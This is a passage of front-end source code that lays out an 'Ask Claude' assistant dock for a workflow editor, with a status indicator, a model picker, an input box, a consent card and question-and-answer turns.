      .bg(alpha(f.culprit ? c.err : c.run, 0.1)).border(1).border_color(alpha(f.culprit ? c.err : c.run, 0.4))
      .when(Boolean(f.culprit), (e) => e.cursor_pointer().hover((st) => st.bg(alpha(c.err, 0.16))).tooltip("Open this node")
        .on_click((_e, cx) => { view.sel.node = f.culprit; view.inspectFromDock = true; cx.notify(); }))
      .child(f.culprit ? icon("alert", 14, c.err) : spinner(13, c.run))
      .child(div().flex_none().text_size(12).text_color(c.muted).child(f.culprit ? "Likely cause" : f.named ? "Flo is scanning" : "Claude is reading"))
      .child(div().flex_1().min_w(0).truncate().text_size(12).font_semibold().text_color(f.culprit ? c.err : c.foreground).child(f.named || f.culprit ? f.node : "the workflow…"))
      .when(f.steps > 1 && !f.culprit, (e) => e.child(div().flex_none().text_size(11).font_family(mono()).text_color(c.dim).child(`${f.step}/${f.steps}`)))
      .when(Boolean(f.culprit), (e) => e.child(icon("chevron", 12, c.err)))
    : null;
  return v_flex().id("dock").w(400).flex_none().h_full().border_l(1).border_color(c.border).bg(c.surface)
    .child(h_flex().px(14).py(10).gap(9).items_center().border_b(1).border_color(c.border)
      .child(h_flex().size(26).rounded(7).items_center().justify_center().bg(alpha(c.brand, 0.16)).child(busy ? spinner(13, c.brand) : icon("spark", 13, c.brand)))
      .child(v_flex().flex_1().min_w(0)
        .child(div().text_size(13).font_semibold().child("Ask Claude"))
        .child(div().truncate().text_size(11).text_color(c.dim).child(mine ? s.scope.label : w.name)))
      .child(modelPicker(view, c))
      .child(button(c, { id: "dock-close", iconName: "close", kind: "subtle", size: "sm", tooltip: "Close", onClick: (_e, cx) => { view.dockOpen = false; cx.notify(); } })))
    .child(v_flex().p(12).gap(8)
      .child(h_flex().gap(8).items_end().p(10).rounded(11).bg(c.background).border(1).border_color(busy ? alpha(c.brand, 0.5) : c.border)
        .child(div().id("dock-input").flex_1().min_w(0).py(2).cursor_text().on_mouse_down("left", (_e, cx) => cx.stop_propagation())
          .child(Textarea.new(view.inputs.ask).w_full().text_size(13).text_color(c.foreground)))
        .child(busy
          ? button(c, { id: "dock-stop", iconName: "stop", kind: "solid", size: "sm", tooltip: "Stop", onClick: (_e, cx) => cx.spawn(async (cx) => { await s.cancel(); cx.notify(); }) })
          : button(c, { id: "dock-send", iconName: "send", kind: "primary", size: "sm", tooltip: "Ask (Enter)", onClick: (_e, cx) => view.askCurrent(cx) })))
      .child(h_flex().gap(6).items_center().child(icon("lock", 10, c.dim))
        .child(div().truncate().text_size(10.5).text_color(c.dim).child("Structure and errors. Run data only when you approve it."))))
    .when(Boolean(status), (e) => e.child(status))
    .when(Boolean(s.pending), (e) => e.child(div().px(12).pt(8).child(consentCard(view, c))))
    .child(v_flex().id("dock-scroll").flex_1().min_h(0).overflow_y_scrollbar().p(12).gap(10)
      .when(!turns.length && !s.pending, (e) => e.children(sug.map((q, i) => h_flex().id(`dsug-${i}`).px(12).py(9).gap(9).items_center().rounded(10)
        .border(1).border_color(c.border).cursor_pointer().hover((st) => st.border_color(alpha(c.brand, 0.6)).bg(c.hover))
        .on_click((_e, cx) => view.ask(q, cx))
        .child(icon("spark", 12, c.brand)).child(div().flex_1().min_w(0).text_size(12.3).child(q)))))
      .children(turns.map((p, i) => v_flex().id(`dpair-${p.q.id}`).gap(8).child(question(c, p.q)).child(answer(c, p.a, i)))));
}
